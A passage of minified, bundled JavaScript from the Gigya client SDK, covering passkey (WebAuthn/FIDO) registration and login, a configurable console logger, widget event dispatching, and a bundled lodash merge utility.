        }, e.prototype.removeOldestUserPreferredLoginMethod = function (e) {
          var t = e[0];
          return this.removeUserPreferredLoginMethod(e, null == t ? void 0 : t.identifier);
        }, e.prototype.addUserPreferredLoginMethod = function (e, t) {
          return i.__spreadArrays(e, [t]);
        }, e;
      }();
    t.SiteDataService = s, t.siteData = new s();
  }, function (e, t) {
    e.exports = function (e) {
      return e.webpackPolyfill || (e.deprecate = function () {}, e.paths = [], e.children || (e.children = []), Object.defineProperty(e, "loaded", {
        enumerable: !0,
        get: function () {
          return e.l;
        }
      }), Object.defineProperty(e, "id", {
        enumerable: !0,
        get: function () {
          return e.i;
        }
      }), e.webpackPolyfill = 1), e;
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(114),
      r = n(33),
      a = n(32),
      s = n(115),
      c = function () {
        function e() {
          this.eventHandlers = new Map();
        }
        return e.prototype.on = function (e, t) {
          this.eventHandlers.get(e) || this.eventHandlers.set(e, []), this.eventHandlers.get(e).push(t);
        }, e.prototype.remove = function (e, t) {
          var n;
          this.eventHandlers.set(e, null === (n = this.eventHandlers.get(e)) || void 0 === n ? void 0 : n.filter(function (e) {
            return e !== t;
          }));
        }, e.prototype.isSupported = function () {
          return s.default.isSupported();
        }, e.prototype.isConditionalMediationAvailable = function () {
          return i.__awaiter(this, void 0, void 0, function () {
            return i.__generator(this, function (e) {
              switch (e.label) {
                case 0:
                  return [4, s.default.isConditionalMediationAvailable()];
                case 1:
                  return [2, e.sent()];
              }
            });
          });
        }, e.prototype.authenticate = function (e) {
          return i.__awaiter(this, void 0, void 0, function () {
            var t = this;
            return i.__generator(this, function (n) {
              return [2, this.runOneAtATime(function () {
                return t.internalAuthenticate(e);
              }, (null == e ? void 0 : e.abortCurrentCeremony) || !1)];
            });
          });
        }, e.prototype.registerPasskey = function (e, t) {
          return void 0 === e && (e = {}), void 0 === t && (t = !1), i.__awaiter(this, void 0, void 0, function () {
            var n = this;
            return i.__generator(this, function (i) {
              return [2, this.runOneAtATime(function () {
                return n.internalRegister(e);
              }, t)];
            });
          });
        }, e.prototype.removePasskey = function (e, t) {
          return i.__awaiter(this, void 0, void 0, function () {
            var n;
            return i.__generator(this, function (i) {
              switch (i.label) {
                case 0:
                  return [4, r.promisify(window.gigya.accounts.auth.fido.removeCredential, {
                    credentialId: e,
                    regToken: t,
                    ignoreApiQueue: !0
                  })];
                case 1:
                  return 0 === (n = i.sent()).errorCode && this.dispatchEvent("passkeyRemoved", {
                    credentialId: e,
                    response: n
                  }), [2, n];
              }
            });
          });
        }, e.prototype.getPasskeys = function (e) {
          return i.__awaiter(this, void 0, void 0, function () {
            return i.__generator(this, function (t) {
              switch (t.label) {
                case 0:
                  return [4, r.promisify(window.gigya.accounts.auth.fido.getCredentials, {
                    regToken: e,
                    ignoreApiQueue: !0
                  })];
                case 1:
                  return [2, t.sent()];
              }
            });
          });
        }, e.prototype.waitForService = function () {
          return i.__awaiter(this, void 0, void 0, function () {
            return i.__generator(this, function (e) {
              switch (e.label) {
                case 0:
                  return e.trys.push([0, 2,, 3]), [4, this.currentRun];
                case 1:
                  return [2, e.sent()];
                case 2:
                  return e.sent(), [3, 3];
                case 3:
                  return [2];
              }
            });
          });
        }, e.prototype.abortCurrentCeremony = function () {
          s.default.abortCurrentCeremony();
        }, e.prototype.dispatchEvent = function (e, t) {
          for (var n = 0, o = this.eventHandlers.get(e) || []; n < o.length; n++) {
            (0, o[n])(t);
          }
          a.dispatch(i.__assign({
            eventName: "passkey." + e
          }, t));
        }, e.prototype.runOneAtATime = function (e, t) {
          return i.__awaiter(this, void 0, void 0, function () {
            return i.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  if (!this.isSupported()) throw s.errorMap.NotSupportedError;
                  return t && s.default.abortCurrentCeremony(), [4, this.waitForService()];
                case 1:
                  return n.sent(), this.currentRun = e(), [2, this.currentRun];
              }
            });
          });
        }, e.prototype.internalRegister = function (t) {
          return void 0 === t && (t = {}), i.__awaiter(this, void 0, void 0, function () {
            var n, a, c, u, l, d;
            return i.__generator(this, function (g) {
              switch (g.label) {
                case 0:
                  return [4, e.getRegistrationOptions(t)];
                case 1:
                  return n = g.sent(), a = n[0], c = n[1], [4, s.default.create(c)];
                case 2:
                  return u = g.sent(), [4, r.promisify(window.gigya.accounts.auth.fido.registerCredentials, i.__assign({
                    token: a,
                    attestation: u,
                    ignoreApiQueue: !0
                  }, t))];
                case 3:
                  if (0 !== (l = g.sent()).errorCode || !l.idToken) throw l;
                  return [4, o.default.connect(l.idToken, t.regToken, !0)];
                case 4:
                  return 0 === (d = g.sent()).errorCode && this.dispatchEvent("passkeyAdded", {
                    response: d
                  }), [2, d];
              }
            });
          });
        }, e.prototype.internalAuthenticate = function (t) {
          return i.__awaiter(this, void 0, void 0, function () {
            var n, a, c, u, l, d;
            return i.__generator(this, function (i) {
              switch (i.label) {
                case 0:
                  return [4, e.getAssertionOptions()];
                case 1:
                  return n = i.sent(), a = n[0], c = n[1], [4, s.default.get(c, null == t ? void 0 : t.mediation)];
                case 2:
                  return u = i.sent(), [4, r.promisify(window.gigya.accounts.auth.fido.verifyAssertion, {
                    authenticatorAssertion: u,
                    token: a
                  })];
                case 3:
                  if (0 !== (l = i.sent()).errorCode || !l.idToken) throw l;
                  return [4, o.default.authorize(l.idToken)];
                case 4:
                  if (0 !== (d = i.sent()).errorCode || !d.code) throw d;
                  return [4, o.default.token(d.code, (null == t ? void 0 : t.dontHandleScreenSet) || !0, null == t ? void 0 : t.sessionExpiration)];
                case 5:
                  return [2, i.sent()];
              }
            });
          });
        }, e.getAssertionOptions = function () {
          return i.__awaiter(this, void 0, void 0, function () {
            var e, t;
            return i.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return [4, r.promisify(window.gigya.accounts.auth.fido.getAssertionOptions)];
                case 1:
                  if (0 !== (e = n.sent()).errorCode || !e.options || !e.token) throw e;
                  return t = JSON.parse(e.options), [2, [e.token, t]];
              }
            });
          });
        }, e.getRegistrationOptions = function (e) {
          return i.__awaiter(this, void 0, void 0, function () {
            var t, n;
            return i.__generator(this, function (o) {
              switch (o.label) {
                case 0:
                  return [4, r.promisify(window.gigya.accounts.auth.fido.initRegisterCredentials, i.__assign(i.__assign({}, e), {
                    ignoreApiQueue: !0
                  }))];
                case 1:
                  if (0 !== (t = o.sent()).errorCode || !t.options || !t.token) throw t;
                  return n = JSON.parse(t.options), [2, [t.token, n]];
              }
            });
          });
        }, e;
      }();
    t.PasskeyService = c, t.default = new c();
  },,,,, function (e, t, n) {
    var i;
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var o = n(0),
      r = n(79),
      a = n(36);
    t.gigErrorReport = "gigErrorReport";
    var s = {
        logLevel: r.LogLevel.disabled,
        clientMuteLevel: 0,
        logTheme: 1
      },
      c = ((i = {})[0] = [""], i[1] = ["38f689", "009FD4", "b381b3", "71b6ef", "64c162", "977bd8", "d168a4", "4c71d2", "84b466", "7d638a", "799fb7", "8fdf98", "dc7767", "0a70f5", "38b159", "af721b", "bfaf6f"], i[2] = ["40806A", "003636", "9B59B6", "DB0A5B", "7928A1", "522032", "0000E0", "00202A", "000036", "005555", "1D781D", "4F5A65", "765AB0", "000000", "3C1362", "000060", "591D77"], i),
      u = r.LogLevel.warn,
      l = function (e) {
        for (var t = [], n = 1; n < arguments.length; n++) t[n - 1] = arguments[n];
      },
      d = function () {
        function e(e) {
          this._global = e, this._groupsStack = [], this._currColorIdx = 0, this.configKey = "gig_loggerConfig", this._console = this._global.console, this.isEnabled && this.overrideClientLogs();
        }
        return e.prototype.getConfig = function () {
          return this._config || (this._config = this.readLoggerConfigFromHash() || this.readLoggerConfigFromCookie() || s), this._config;
        }, Object.defineProperty(e.prototype, "isEnabled", {
          get: function () {
            return this.getConfig().logLevel > r.LogLevel.disabled;
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e.prototype, "logLevel", {
          get: function () {
            return this.getConfig().logLevel;
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e.prototype, "palette", {
          get: function () {
            return c[this.getConfig().logTheme];
          },
          enumerable: !0,
          configurable: !0
        }), e.prototype.getNextColor = function () {
          return 0 === this.getConfig().logTheme ? "" : (this._currColorIdx >= this.palette.length && (this._currColorIdx = 0), "#" + this.palette[this._currColorIdx++]);
        }, Object.defineProperty(e.prototype, "currentGroup", {
          get: function () {
            return this._groupsStack[this._groupsStack.length - 1];
          },
          enumerable: !0,
          configurable: !0
        }), e.prototype.readLoggerConfigFromHash = function () {
          var e = null,
            t = a.getReqParamValue(location.hash, this.configKey);
          if (t) try {
            e = JSON.parse(decodeURIComponent(t));
          } catch (e) {
            console.error("[Gigya]: exception while trying to parse logger config from hash", e);
          }
          return e;
        }, e.prototype.readLoggerConfigFromCookie = function () {
          try {
            var e = null,
              t = a.getParamValue(document.cookie, this.configKey, ";");
            if (t) try {
              e = JSON.parse(t);
            } catch (e) {
              console.error("[Gigya]: exception while trying to parse logger config from cookie", e);
            }
            return e;
          } catch (e) {
            return;
          }
        }, e.prototype.setLoggerConfigCookie = function (e) {
          document.cookie = this.configKey + "=" + JSON.stringify(e);
        }, e.prototype.overrideClientLogs = function () {
          var e = this,
            t = this._global.Proxy;
          if (t) switch (this.getConfig().clientMuteLevel) {
            case 0:
              break;
            case 2:
              this._global.console = new t(this._global.console, {
                get: function () {
                  return l;
                }
              });
              break;
            case 1:
            default:
              this._global.console = new t(this._global.console, {
                get: function (t, n) {
                  return -1 !== ["group", "groupCollapsed", "groupEnd"].indexOf(n) ? function () {
                    for (var t, i = [], r = 0; r < arguments.length; r++) i[r] = arguments[r];
                    return (t = e._console).log.apply(t, o.__spreadArrays(["client has called console." + n], i));
                  } : t[n];
                }
              });
          }
        }, e.prototype.getFormattedLogArgs = function (e, t) {
          return void 0 === e && (e = ""), void 0 === t && (t = this.currentGroup), {
            text: t ? "%c█" + e : "%c" + e,
            css: t ? "color: " + t.color + ";" : ""
          };
        }, e.prototype.restoreHangingGroups = function (e) {
          for (; e.length;) {
            var t = e.shift();
            this._groupsStack.push(t);
            var n = this.getFormattedLogArgs(" %c[RESTORED - " + t.groupTitle + "]");
            this._console.groupCollapsed(n.text, n.css, "color: #b0b0b0b0;");
          }
        }, e.prototype.endGroup = function (e) {
          var t = this.getFormattedLogArgs(" [END - " + e.groupTitle + "]", e);
          this._console.log(t.text, t.css), this._console.groupEnd();
        }, e.prototype.log = function (e) {
          if (this.isEnabled && e >= this.logLevel || e >= u && this.logLevel < u) {
            var t = r.LogLevel[e],
              n = e === r.LogLevel.debug ? r.LogLevel[r.LogLevel.info] : t,
              i = this.getFormattedLogArgs(" %c[" + t + "]");
            return this._console[n].bind(this._console, i.text, i.css, e <= r.LogLevel.info ? "color: #b0b0b0b0;" : "");
          }
          return l;
        }, e.prototype.getJsonFromError = function (e) {
          return {
            name: e.name,
            message: e.message,
            stack: e.stack
          };
        }, e.prototype.errorParser = function (e) {
          var t = this;
          return JSON.parse(JSON.stringify(e, function (e, n) {
            return n instanceof Error ? t.getJsonFromError(n) : n;
          }));
        }, Object.defineProperty(e.prototype, "debug", {
          get: function () {
            return this.log(r.LogLevel.debug);
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e.prototype, "info", {
          get: function () {
            return this.log(r.LogLevel.info);
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e.prototype, "warn", {
          get: function () {
            return this.log(r.LogLevel.warn);
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e.prototype, "error", {
          get: function () {
            var e = this;
            return function (t, n) {
              n && "object" == typeof n && (n = e.errorParser(n)), e.log(r.LogLevel.error).apply(e, [t].concat([n])), e.report(t, n);
            };
          },
          enumerable: !0,
          configurable: !0
        }), e.prototype.group = function (e, t) {
          var n = this;
          if (void 0 === t && (t = !0), this.isEnabled) {
            var i = this.getNextColor();
            this._groupsStack.push({
              groupTitle: e,
              color: i
            });
            var o = this.getFormattedLogArgs(" [START - " + e + "]");
            !function () {
              for (var e, i, o = [], r = 0; r < arguments.length; r++) o[r] = arguments[r];
              t ? (e = n._console).groupCollapsed.apply(e, o) : (i = n._console).group.apply(i, o);
            }(o.text, o.css);
          }
          return {
            end: function () {
              return n.groupEnd(e);
            },
            endWhen: function (t) {
              "function" == typeof t && (t = t()), t && t.then ? t.then(function () {
                return n.groupEnd(e);
              }) : n.groupEnd(e);
            }
          };
        }, e.prototype.groupEnd = function (e) {
          if (this.isEnabled) {
            for (var t = [], n = this._groupsStack.pop(); n.groupTitle !== e && this._groupsStack.length;) t.unshift(n), n = this._groupsStack.pop(), this._console.groupEnd();
            this.endGroup(n), t.length && this.restoreHangingGroups(t);
          }
        }, e.prototype.enable = function (e, t, n) {
          void 0 === e && (e = r.LogLevel.info), void 0 === t && (t = 1), void 0 === n && (n = 1), this.setLoggerConfigCookie({
            logLevel: e,
            clientMuteLevel: t,
            logTheme: n
          });
        }, e.prototype.disable = function () {
          this.setLoggerConfigCookie({
            logLevel: r.LogLevel.disabled,
            clientMuteLevel: s.clientMuteLevel,
            logTheme: s.logTheme
          });
        }, e;
      }();
    t.BaseLogger = d;
  },, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(4),
      o = n(45),
      r = n(27),
      a = n(18),
      s = n(93);
    function c(e) {
      return "on" === e.substring(0, 2) ? e : "on" + e.substring(0, 1).toUpperCase() + e.substring(1);
    }
    function u(e, t) {
      if (e && e.eventName) {
        var n = e.eventName;
        o.addLog('Dispatching widget event "' + n + '" for ' + t.lastSource + " with this event object", e), r.handleSpecialFields(e);
        for (var i, a = n.split(","), s = 0; s < a.length; s++) {
          var u = a[s],
            g = c(u);
          if (t && (t.context && (e.context = t.context), t.source && (e.source = t.source), t.sourceData && (e.sourceData = t.sourceData), t.containerID && (e.sourceContainerID = t.containerID), t.instanceID && (e.instanceID = t.instanceID)), t[g] && (i = l(t[g], e)), void 0 === i && (i = !0), -1 == u.indexOf("login") && -1 == u.indexOf("logout") && "connectionRemoved" != u && "connectionAdded" != u) {
            d(e);
            var f = window.GenesisExchange_Gigya,
              p = window.gigya_omniture_conf,
              h = window.myOmnitureIntegrationFunc;
            if (void 0 !== f && void 0 !== p) new f(p).processAction(e), void 0 !== h && h(p, e);
          }
        }
        return i;
      }
    }
    function l(e, t) {
      var n;
      try {
        "function" == typeof e ? n = e(t) : e instanceof Array ? a.forEach(e, function (e) {
          "function" == typeof e ? e(t) : o.addLog("Not a function registered to event: " + e, e);
        }) : o.addLog("Not a function or function array registered to event", e);
      } catch (t) {
        o.addLog("Error invoking function registered to event", e);
      }
      return n;
    }
    function d(e, t) {
      void 0 === t && (t = !1);
      for (var n = [], i = !1, r = 0; r < window.gigya.defaultEventMaps.length; r++) {
        for (var a = window.gigya.defaultEventMaps[r].eventMap, c = window.gigya.defaultEventMaps[r].defaultMethod, u = 0; u < a.length; u++) {
          var l = a[u],
            d = [];
          l.args || (l.args = []);
          for (var g = 0; g < l.args.length; g++) "$event" == l.args[g] ? d.push(e) : d.push(s.fill(l.args[g], e));
          var f = "," + l.events.toLowerCase() + ",";
          if (-1 != f.indexOf(",*,") || (-1 != f.indexOf(",on" + e.eventName.toLowerCase() + ",") || -1 != f.indexOf("," + e.eventName.toLowerCase() + ",")) && (!e.source && !l.sources || !l.sources || -1 != l.sources.indexOf(e.source))) {
            n.push(l);
            var p = l.method ? l.method : c;
            try {
              p.apply(this, d);
            } catch (e) {
              o.addLog("Error invoking function registered to events map's method", p);
            }
            l.override && (i = !0);
          }
        }
        if (i) break;
      }
    }
    t.addMap = function (e) {
      window.gigya.defaultEventMaps.splice(0, 0, e);
    }, t.dispatchErrorFromResponse = function (e, t, n) {
      t || (t = {});
      var o = t;
      o.response && (o = o.response);
      var r = {
        eventName: "error",
        status: o.status ? o.status : "FAIL",
        statusMessage: o.statusMessage ? o.statusMessage : "General Server Error",
        errorMessage: o.errorMessage ? o.errorMessage : "General Server Error",
        errorDetails: o.errorDetails ? o.errorDetails : "",
        errorCode: o.errorCode ? o.errorCode : 500001,
        response: t
      };
      return i.add(r, n), u(r, e);
    }, t.dispatchInvalidParamError = function (e, t) {
      var n = {
        eventName: "error"
      };
      void 0 === e[t] || null == e[t] ? (n.errorCode = 400002, n.errorMessage = "Missing_required_parameter (" + t + ")") : (n.errorCode = 400006, n.errorMessage = "Invalid_parameter_value (" + t + ")"), n.status = n.errorCode, n.statusMessage = n.errorMessage, u(n, e);
    }, t.dispatchForWidget = u, t.dispatchEventObject = l, t._dispatchFromMaps = d;
  }, function (e, t, n) {
    (function (e, n) {
      var i = /^\[object .+?Constructor\]$/,
        o = /^(?:0|[1-9]\d*)$/,
        r = {};
      r["[object Float32Array]"] = r["[object Float64Array]"] = r["[object Int8Array]"] = r["[object Int16Array]"] = r["[object Int32Array]"] = r["[object Uint8Array]"] = r["[object Uint8ClampedArray]"] = r["[object Uint16Array]"] = r["[object Uint32Array]"] = !0, r["[object Arguments]"] = r["[object Array]"] = r["[object ArrayBuffer]"] = r["[object Boolean]"] = r["[object DataView]"] = r["[object Date]"] = r["[object Error]"] = r["[object Function]"] = r["[object Map]"] = r["[object Number]"] = r["[object Object]"] = r["[object RegExp]"] = r["[object Set]"] = r["[object String]"] = r["[object WeakMap]"] = !1;
      var a = "object" == typeof e && e && e.Object === Object && e,
        s = "object" == typeof self && self && self.Object === Object && self,
        c = a || s || Function("return this")(),
        u = t && !t.nodeType && t,
        l = u && "object" == typeof n && n && !n.nodeType && n,
        d = l && l.exports === u,
        g = d && a.process,
        f = function () {
          try {
            var e = l && l.require && l.require("util").types;
            return e || g && g.binding && g.binding("util");
          } catch (e) {}
        }(),
        p = f && f.isTypedArray;
      function h(e, t, n) {
        switch (n.length) {
          case 0:
            return e.call(t);
          case 1:
            return e.call(t, n[0]);
          case 2:
            return e.call(t, n[0], n[1]);
          case 3:
            return e.call(t, n[0], n[1], n[2]);
        }
        return e.apply(t, n);
      }
      var v,
        y,
        w,
        m = Array.prototype,
        _ = Function.prototype,
        b = Object.prototype,
        S = c["__core-js_shared__"],
        P = _.toString,
        A = b.hasOwnProperty,
        I = (v = /[^.]+$/.exec(S && S.keys && S.keys.IE_PROTO || "")) ? "Symbol(src)_1." + v : "",
        k = b.toString,
        C = P.call(Object),
        x = RegExp("^" + P.call(A).replace(/[\\^$.*+?()[\]{}|]/g, "\\$&").replace(/hasOwnProperty|(function).*?(?=\\\()| for .+?(?=\\\])/g, "$1.*?") + "$"),
        O = d ? c.Buffer : void 0,
        E = c.Symbol,
        T = c.Uint8Array,
        L = O ? O.allocUnsafe : void 0,
        D = (y = Object.getPrototypeOf, w = Object, function (e) {
          return y(w(e));
        }),
        j = Object.create,
        M = b.propertyIsEnumerable,
        R = m.splice,
        U = E ? E.toStringTag : void 0,
        N = function () {
          try {
            var e = ue(Object, "defineProperty");
            return e({}, "", {}), e;
          } catch (e) {}
        }(),
        z = O ? O.isBuffer : void 0,
        F = Math.max,
        K = Date.now,
        B = ue(c, "Map"),
        G = ue(Object, "create"),
        q = function () {
          function e() {}
          return function (t) {
            if (!be(t)) return {};
            if (j) return j(t);
            e.prototype = t;
            var n = new e();
            return e.prototype = void 0, n;
          };
        }();
      function V(e) {
        var t = -1,
          n = null == e ? 0 : e.length;
        for (this.clear(); ++t < n;) {
          var i = e[t];
          this.set(i[0], i[1]);
        }
      }
      function H(e) {
        var t = -1,
          n = null == e ? 0 : e.length;
        for (this.clear(); ++t < n;) {
          var i = e[t];
          this.set(i[0], i[1]);
        }
      }
      function W(e) {
        var t = -1,
          n = null == e ? 0 : e.length;
        for (this.clear(); ++t < n;) {
          var i = e[t];
          this.set(i[0], i[1]);
        }
      }
      function J(e) {
        var t = this.__data__ = new H(e);
        this.size = t.size;
      }
      function $(e, t) {
        var n = ve(e),
          i = !n && he(e),
          o = !n && !i && we(e),
          r = !n && !i && !o && Pe(e),
          a = n || i || o || r,
          s = a ? function (e, t) {
            for (var n = -1, i = Array(e); ++n < e;) i[n] = t(n);
            return i;
          }(e.length, String) : [],
          c = s.length;
        for (var u in e) !t && !A.call(e, u) || a && ("length" == u || o && ("offset" == u || "parent" == u) || r && ("buffer" == u || "byteLength" == u || "byteOffset" == u) || le(u, c)) || s.push(u);
        return s;
      }
      function Y(e, t, n) {
        (void 0 !== n && !pe(e[t], n) || void 0 === n && !(t in e)) && Z(e, t, n);
      }
      function Q(e, t, n) {
        var i = e[t];
        A.call(e, t) && pe(i, n) && (void 0 !== n || t in e) || Z(e, t, n);
      }
      function X(e, t) {
        for (var n = e.length; n--;) if (pe(e[n][0], t)) return n;
        return -1;
      }
      function Z(e, t, n) {
        "__proto__" == t && N ? N(e, t, {
          configurable: !0,
          enumerable: !0,
          value: n,
          writable: !0
        }) : e[t] = n;
      }
      V.prototype.clear = function () {
        this.__data__ = G ? G(null) : {}, this.size = 0;
      }, V.prototype.delete = function (e) {
        var t = this.has(e) && delete this.__data__[e];
        return this.size -= t ? 1 : 0, t;
      }, V.prototype.get = function (e) {
        var t = this.__data__;
        if (G) {
          var n = t[e];
          return "__lodash_hash_undefined__" === n ? void 0 : n;
        }
        return A.call(t, e) ? t[e] : void 0;
      }, V.prototype.has = function (e) {
        var t = this.__data__;
        return G ? void 0 !== t[e] : A.call(t, e);
      }, V.prototype.set = function (e, t) {
        var n = this.__data__;
        return this.size += this.has(e) ? 0 : 1, n[e] = G && void 0 === t ? "__lodash_hash_undefined__" : t, this;
      }, H.prototype.clear = function () {
        this.__data__ = [], this.size = 0;
      }, H.prototype.delete = function (e) {
        var t = this.__data__,
          n = X(t, e);
        return !(n < 0) && (n == t.length - 1 ? t.pop() : R.call(t, n, 1), --this.size, !0);
      }, H.prototype.get = function (e) {
        var t = this.__data__,
          n = X(t, e);
        return n < 0 ? void 0 : t[n][1];
      }, H.prototype.has = function (e) {
        return X(this.__data__, e) > -1;
      }, H.prototype.set = function (e, t) {
        var n = this.__data__,
          i = X(n, e);
        return i < 0 ? (++this.size, n.push([e, t])) : n[i][1] = t, this;
      }, W.prototype.clear = function () {
        this.size = 0, this.__data__ = {
          hash: new V(),
          map: new (B || H)(),
          string: new V()
        };
      }, W.prototype.delete = function (e) {
        var t = ce(this, e).delete(e);
        return this.size -= t ? 1 : 0, t;
      }, W.prototype.get = function (e) {
        return ce(this, e).get(e);
      }, W.prototype.has = function (e) {
        return ce(this, e).has(e);
      }, W.prototype.set = function (e, t) {
        var n = ce(this, e),
          i = n.size;
        return n.set(e, t), this.size += n.size == i ? 0 : 1, this;
      }, J.prototype.clear = function () {
        this.__data__ = new H(), this.size = 0;
      }, J.prototype.delete = function (e) {
        var t = this.__data__,
          n = t.delete(e);
        return this.size = t.size, n;
      }, J.prototype.get = function (e) {
        return this.__data__.get(e);
      }, J.prototype.has = function (e) {
        return this.__data__.has(e);
      }, J.prototype.set = function (e, t) {
        var n = this.__data__;
        if (n instanceof H) {
          var i = n.__data__;
          if (!B || i.length < 199) return i.push([e, t]), this.size = ++n.size, this;
          n = this.__data__ = new W(i);
        }
        return n.set(e, t), this.size = n.size, this;
      };
      var ee,
        te = function (e, t, n) {
          for (var i = -1, o = Object(e), r = n(e), a = r.length; a--;) {
            var s = r[ee ? a : ++i];
            if (!1 === t(o[s], s, o)) break;
          }
          return e;
        };
      function ne(e) {
        return null == e ? void 0 === e ? "[object Undefined]" : "[object Null]" : U && U in Object(e) ? function (e) {
          var t = A.call(e, U),
            n = e[U];
          try {
            e[U] = void 0;
            var i = !0;
          } catch (e) {}
          var o = k.call(e);
          i && (t ? e[U] = n : delete e[U]);
          return o;
        }(e) : function (e) {
          return k.call(e);
        }(e);
      }
      function ie(e) {
        return Se(e) && "[object Arguments]" == ne(e);
      }
      function oe(e) {
        return !(!be(e) || function (e) {
          return !!I && I in e;
        }(e)) && (me(e) ? x : i).test(function (e) {
          if (null != e) {
            try {
              return P.call(e);
            } catch (e) {}
            try {
              return e + "";
            } catch (e) {}
          }
          return "";
        }(e));
      }
      function re(e) {
        if (!be(e)) return function (e) {
          var t = [];
          if (null != e) for (var n in Object(e)) t.push(n);
          return t;
        }(e);
        var t = de(e),
          n = [];
        for (var i in e) ("constructor" != i || !t && A.call(e, i)) && n.push(i);
        return n;
      }
      function ae(e, t, n, i, o) {
        e !== t && te(t, function (r, a) {
          if (o || (o = new J()), be(r)) !function (e, t, n, i, o, r, a) {
            var s = ge(e, n),
              c = ge(t, n),
              u = a.get(c);
            if (u) return void Y(e, n, u);
            var l = r ? r(s, c, n + "", e, t, a) : void 0,
              d = void 0 === l;
            if (d) {
              var g = ve(c),
                f = !g && we(c),
                p = !g && !f && Pe(c);
              l = c, g || f || p ? ve(s) ? l = s : Se(m = s) && ye(m) ? l = function (e, t) {
                var n = -1,
                  i = e.length;
                t || (t = Array(i));
                for (; ++n < i;) t[n] = e[n];
                return t;
              }(s) : f ? (d = !1, l = function (e, t) {
                if (t) return e.slice();
                var n = e.length,
                  i = L ? L(n) : new e.constructor(n);
                return e.copy(i), i;
              }(c, !0)) : p ? (d = !1, h = c, v = !0 ? (y = h.buffer, w = new y.constructor(y.byteLength), new T(w).set(new T(y)), w) : h.buffer, l = new h.constructor(v, h.byteOffset, h.length)) : l = [] : function (e) {
                if (!Se(e) || "[object Object]" != ne(e)) return !1;
                var t = D(e);
                if (null === t) return !0;
                var n = A.call(t, "constructor") && t.constructor;
                return "function" == typeof n && n instanceof n && P.call(n) == C;
              }(c) || he(c) ? (l = s, he(s) ? l = function (e) {
                return function (e, t, n, i) {
                  var o = !n;
                  n || (n = {});
                  var r = -1,
                    a = t.length;
                  for (; ++r < a;) {
                    var s = t[r],
                      c = i ? i(n[s], e[s], s, n, e) : void 0;
                    void 0 === c && (c = e[s]), o ? Z(n, s, c) : Q(n, s, c);
                  }
                  return n;
                }(e, Ae(e));
              }(s) : be(s) && !me(s) || (l = function (e) {
                return "function" != typeof e.constructor || de(e) ? {} : q(D(e));
              }(c))) : d = !1;
            }
            var h, v, y, w;
            var m;
            d && (a.set(c, l), o(l, c, i, r, a), a.delete(c));
            Y(e, n, l);
          }(e, t, a, n, ae, i, o);else {
            var s = i ? i(ge(e, a), r, a + "", e, t, o) : void 0;
            void 0 === s && (s = r), Y(e, a, s);
          }
        }, Ae);
      }
      function se(e, t) {
        return fe(function (e, t, n) {
          return t = F(void 0 === t ? e.length - 1 : t, 0), function () {
            for (var i = arguments, o = -1, r = F(i.length - t, 0), a = Array(r); ++o < r;) a[o] = i[t + o];
            o = -1;
            for (var s = Array(t + 1); ++o < t;) s[o] = i[o];
            return s[t] = n(a), h(e, this, s);
          };
        }(e, t, Ce), e + "");
      }
      function ce(e, t) {
        var n,
          i,
          o = e.__data__;
        return ("string" == (i = typeof (n = t)) || "number" == i || "symbol" == i || "boolean" == i ? "__proto__" !== n : null === n) ? o["string" == typeof t ? "string" : "hash"] : o.map;
      }
      function ue(e, t) {
        var n = function (e, t) {
          return null == e ? void 0 : e[t];
        }(e, t);
        return oe(n) ? n : void 0;
      }
      function le(e, t) {
        var n = typeof e;
        return !!(t = null == t ? 9007199254740991 : t) && ("number" == n || "symbol" != n && o.test(e)) && e > -1 && e % 1 == 0 && e < t;
      }
      function de(e) {
        var t = e && e.constructor;
        return e === ("function" == typeof t && t.prototype || b);
      }
      function ge(e, t) {
        if (("constructor" !== t || "function" != typeof e[t]) && "__proto__" != t) return e[t];
      }
      var fe = function (e) {
        var t = 0,
          n = 0;
        return function () {
          var i = K(),
            o = 16 - (i - n);
          if (n = i, o > 0) {
            if (++t >= 800) return arguments[0];
          } else t = 0;
          return e.apply(void 0, arguments);
        };
      }(N ? function (e, t) {
        return N(e, "toString", {
          configurable: !0,
          enumerable: !1,
          value: (n = t, function () {
            return n;
          }),
          writable: !0
        });
        var n;
      } : Ce);
      function pe(e, t) {
        return e === t || e != e && t != t;
      }
      var he = ie(function () {
          return arguments;
        }()) ? ie : function (e) {
          return Se(e) && A.call(e, "callee") && !M.call(e, "callee");
        },
        ve = Array.isArray;
      function ye(e) {
        return null != e && _e(e.length) && !me(e);
      }
      var we = z || function () {
        return !1;
      };
      function me(e) {
        if (!be(e)) return !1;
        var t = ne(e);
        return "[object Function]" == t || "[object GeneratorFunction]" == t || "[object AsyncFunction]" == t || "[object Proxy]" == t;
      }
      function _e(e) {
        return "number" == typeof e && e > -1 && e % 1 == 0 && e <= 9007199254740991;
      }
      function be(e) {
        var t = typeof e;
        return null != e && ("object" == t || "function" == t);
      }
      function Se(e) {
        return null != e && "object" == typeof e;
      }
      var Pe = p ? function (e) {
        return function (t) {
          return e(t);
        };
      }(p) : function (e) {
        return Se(e) && _e(e.length) && !!r[ne(e)];
      };
      function Ae(e) {
        return ye(e) ? $(e, !0) : re(e);
      }
      var Ie,
        ke = (Ie = function (e, t, n) {
          ae(e, t, n);
        }, se(function (e, t) {
          var n = -1,
            i = t.length,
            o = i > 1 ? t[i - 1] : void 0,
            r = i > 2 ? t[2] : void 0;
          for (o = Ie.length > 3 && "function" == typeof o ? (i--, o) : void 0, r && function (e, t, n) {
            if (!be(n)) return !1;
            var i = typeof t;
            return !!("number" == i ? ye(n) && le(t, n.length) : "string" == i && t in n) && pe(n[t], e);
          }(t[0], t[1], r) && (o = i < 3 ? void 0 : o, i = 1), e = Object(e); ++n < i;) {
            var a = t[n];
            a && Ie(e, a, n, o);
          }
          return e;
        }));
      function Ce(e) {
        return e;
      }
      n.exports = ke;
    }).call(this, n(23), n(51)(e));
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0);
    function o(e, t) {
      return window.gigya.utils.URL.addParamsToURL(e, t);
    }
